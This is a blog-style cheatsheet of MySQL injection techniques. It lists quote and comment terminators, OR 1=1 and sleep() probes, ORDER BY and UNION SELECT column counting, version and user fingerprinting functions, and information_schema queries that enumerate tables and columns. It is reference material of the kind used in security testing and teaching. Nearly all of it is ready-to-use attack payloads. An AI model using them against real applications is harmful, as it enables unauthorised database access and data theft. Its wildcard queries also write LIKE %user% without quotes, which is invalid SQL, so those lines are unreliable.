---
title: MySQL Injection Cheatsheet
date: 2020-07-29 13:10:00
tags: [sqli, sql injection, cheatsheet, web attacks]
---

# MySQL Injection cheatsheet

## Testing checklist 

| Name | Character | Function |
| ------ | ----------- | ---------- |
| Single quote | `'` | String terminator |
| Semi colon | `;` | Query terminator |
| Comment | `-- -` | Removes the rest of the query |
| Comment | `#` | Removes the rest of the query |
| Comment | `/*comment this*/` | Can be placed anywhere in a query, used for bypassing weak filters |
| Single quote with a comment | `'-- -` | End a string and remove rest of the query |
| Single quote, semi colon and a comment | `';-- -` | End a string, end query, and remove rest of the query |
| OR operator | `OR 1=1-- -` | For integers, `true` test |
| OR operator | `OR 1=2-- -` | For integers, `false` test |
| OR operator | `' OR '1'='1'-- -` | For strings, `test` test |
| AND operator | `AND 1=1-- -` | For integers, `true` test |
| AND operator | `AND 1=2-- -` | For integers, `false` test |
| AND operator | `' AND '1'='1'-- -` | For strings, `true` test |
| Arithmetic | `?id=2-1` | For integers, arithmetic operation would load the resultant post |
| Sleep function | `OR sleep(5)-- -` | Blind test |

## Functions

| Function | Description |
| ------ | ------------- |
| `database()` | Get the name of the working database | 
| `user()` | Get the name of the user operating on the working database |
| `version()` | MySQL version | 
| `concat()` | Concatenate two or more strings per row | 
| `group_concat()` | Concatenate all the strings in one row | 
| `substring('string'/<column_name>,<offset>,<length>)` | Get a part of the value of a string or column |
| `ord()` | Convert the value to ordinal (decimal) | 


## Number of Columns

| Method | Description | 
| ------ | ---------- |
| `ORDER BY 3-- -` | For numbers. If column index provided exceeds the number of column present in the table, there will be an error |
| `' ORDER BY 3-- -` | For string. If column index provided exceeds the number of column present in the table, there will be an error |
| ` UNION SELECT 1,2,3-- -` | For numbers. It will throw an error till right number of columns haven't been "SELECT"ed |

## Database Contents
*Works with UNION queries*

Get the tables present in your working database:
``` SQL
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
```

Once you get the tables, you can get the columns from those tables:

``` SQL
SELECT column_name FROM information_schema.columns WHERE table_name='x'
```

## Wildcards:

Get any table which consists the term "user" anywhere:

``` SQL
SELECT table_name FROM information_schema.tables WHERE table_name like %user%
```

Get any column which consists the term "user" in it:

``` SQL
SELECT column_name FROM information_schema.columns WHERE column_name like %user%;

/* Get columns along with its respective tables */
SELECT GROUP_CONCAT(column_name,0x3a,table_name,'\r\n') FROM information_schema.columns WHERE column_name like %user%;
```


## Fin 

If you found some mistake, or would like me to add something, feel free to contact me :)

Other DB SQL injection cheatsheets will be added soon.